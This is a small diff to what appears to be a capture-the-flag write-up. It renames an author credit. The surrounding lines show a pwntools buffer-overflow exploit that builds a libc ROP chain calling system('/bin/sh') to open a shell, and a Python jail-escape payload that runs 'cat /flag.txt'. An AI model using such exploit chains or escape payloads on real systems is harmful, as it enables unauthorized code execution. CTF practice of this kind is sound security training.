@@ -108,7 +108,7 @@ print(f"{hex(libc.address)=}")
 p.sendlineafter("at? ",b'a'*0x28+p64(0x0040123f)+p64(next(libc.search(asm('pop rdi; ret'), executable=True)))+p64(libc.search(b'/bin/sh').__next__())+p64(libc.sym['system']))
 p.interactive()
 ```
-# By `superman_.22`
+# By `superman`
 
 - easy jail 1
     - `__import__('os').system('cat /flag.txt')`
